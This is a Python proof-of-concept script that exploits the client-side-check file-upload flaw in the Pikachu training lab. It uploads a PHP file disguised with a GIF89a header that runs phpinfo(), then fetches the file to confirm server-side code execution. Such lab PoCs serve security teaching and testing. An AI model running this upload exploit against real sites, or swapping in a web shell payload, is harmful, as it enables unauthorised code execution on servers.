import requests
import sys
import re

def pikachu_upload(url):
    path1 = "/pikachu/vul/unsafeupload/clientcheck.php"
    path2 = "/pikachu/vul/unsafeupload/uploads/"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}
    files = {
        "uploadfile": ("xxx2.php","GIF89a\n<?php phpinfo();?>"),
        "submit": (None, "开始上传")
    }
    # 1、上传文件
    res1 = requests.post(url + path1, headers = headers, files = files)
    # 获取上传后的文件名
    fileName = re.search(r'uploads/(.*).php', res1.text).group(1)
    # 文件完整URL
    filePath = url + path2 + fileName + ".php"

    # 2、请求上传的文件地址
    res2 = requests.get(filePath, headers = headers)
    if res2.status_code == 200 and "PHP Version" in res2.text:
        print("[+]", url, "存在文件上传漏洞")
    else:
        print("[-]", url, "未发现文件上传漏洞")

if "__main__" == __name__:
    url = sys.argv[1]
    pikachu_upload(url)